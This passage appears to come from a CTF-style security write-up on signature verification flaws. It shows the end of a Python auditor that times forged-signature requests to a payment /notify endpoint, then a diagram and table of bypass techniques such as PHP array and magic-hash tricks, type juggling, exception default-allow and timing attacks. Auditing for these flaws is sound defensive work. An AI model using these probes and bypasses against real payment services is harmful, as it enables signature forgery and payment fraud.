        # 用不同偏移的签名测量时间
        correct_prefix = "a" * 32  # 假设 32 hex chars
        wrong_early = "b" + "a" * 31
        wrong_late  = "a" * 31 + "b"

        def measure(sig):
            times = []
            for _ in range(20):
                start = time.perf_counter()
                try:
                    S.post(self.base + "/notify", json={
                        "order_id": "TEST", "sign": sig,
                    }, timeout=10)
                except:
                    pass
                times.append(time.perf_counter() - start)
            return statistics.median(times)

        t_early = measure(wrong_early)
        t_late = measure(wrong_late)
        diff = t_late - t_early

        if diff > 0.001:  # > 1ms 差异
            self.add("Timing-leak",
                f"Timing difference detected: {diff:.4f}s")
            print(f"  [i] Early byte wrong: {t_early:.4f}s")
            print(f"  [i] Late byte wrong:  {t_late:.4f}s")
            print(f"  [i] Diff:             {diff:.4f}s ← 可时序攻击")


if __name__ == "__main__":
    print("=" * 60)
    print(" Signature Implementation Bug Auditor")
    print("=" * 60)

    auditor = SignatureImplAuditor(TARGET)
    findings = auditor.audit_all()

    print(f"\n{'='*60}")
    print(f" Audit Complete — {len(findings)} finding(s)")
    print(f"{'='*60}")

    if findings:
        print("\nSummary by category:")
        cats = {}
        for f in findings:
            cat = f["category"]
            cats[cat] = cats.get(cat, 0) + 1
        for cat, count in sorted(cats.items()):
            print(f"  {cat:20s}: {count}")
    else:
        print("\n  No implementation bugs found (or endpoints not reachable)")
```

## 攻击链总结

```mermaid
graph TD
    PHP_STRCMP["PHP strcmp数组<br/>sign[]=x → NULL==0"] --> BYPASS["签名绕过"]
    PHP_MD5["PHP md5/sha1数组<br/>data[]=x → NULL"] --> BYPASS
    PHP_MAGIC["PHP Magic Hash<br/>\"0e...\"==\"0e...\""] --> BYPASS
    PHP_ZERO["PHP 0==string<br/>status=0 → \"paid\"==0"] --> BYPASS
    PHP_EXTRACT["PHP extract/parse_str<br/>变量覆盖"] --> BYPASS
    PY_EXCEPT["Python 异常跳过<br/>TypeError → default allow"] --> BYPASS
    JS_TYPE["JS 类型强制<br/>\"0\"==false, []==\"\""] --> BYPASS
    JAVA_NULL["Java Null<br/>Missing field → NPE → allow"] --> BYPASS
    TIMING["时序攻击<br/>字节级恢复签名"] --> FORGE["签名伪造"]
    TRUNC["截断<br/>只查前4/空签通过"] --> BYPASS
    BYPASS --> FLAG["🏴 签名信任被攻破"]
    FORGE --> FLAG
```

## Benchmark: 各语言实现缺陷分布

| 缺陷分类 | PHP | Python | JS | Java | 频率 (CTF) |
|---|---|---|---|---|---|
| 数组绕过 strcmp/md5/sha1 | 高 | 低 | 低 | 低 | 极高 |
| Type Juggling / 类型强制 | 高 | 中 | 中 | 低 | 极高 |
| Magic Hash 攻击 | 极高 | 无 | 无 | 无 | 极高 |
| 异常导致默认 allow | 中 | 高 | 中 | 中 | 高 |
| 时序攻击 (constant-time) | 低 | 中 | 中 | 中 | 中 |
| Null 字节截断 | 中 | 低 | 低 | 低 | 中 |
| 编码/Unicode 归一化 | 中 | 中 | 中 | 中 | 中 |
| 空签名/缺失签名 | 高 | 高 | 高 | 高 | 极高 |
